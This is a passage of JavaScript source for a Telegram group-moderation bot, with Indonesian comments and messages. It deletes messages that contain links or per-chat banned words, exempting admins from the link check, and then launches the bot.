    if (await isAdmin(ctx)) return

    if (link.test(ctx.message.text)) {
        await ctx.deleteMessage()
        ctx.reply('🚫 Link dilarang!')
    }
})
// Detekesi Pesan
bot.on("message", async (ctx) => {
  if (!ctx.chat || ctx.chat.type === "private") return;
  if (!ctx.message.text) return;

  const chatId = ctx.chat.id;
  if (!badWords[chatId]) return;

  const msgText = ctx.message.text.toLowerCase();

  for (const word of badWords[chatId]) {
    if (msgText.includes(word)) {
      try {
        await ctx.deleteMessage();
        await ctx.reply(
          `⚠️ Pesan dihapus!\nKata terlarang terdeteksi: "${word}"`
        );
      } catch (e) {}
      break;
    }
  }
});
//END TOOLS GAME//
bot.launch()
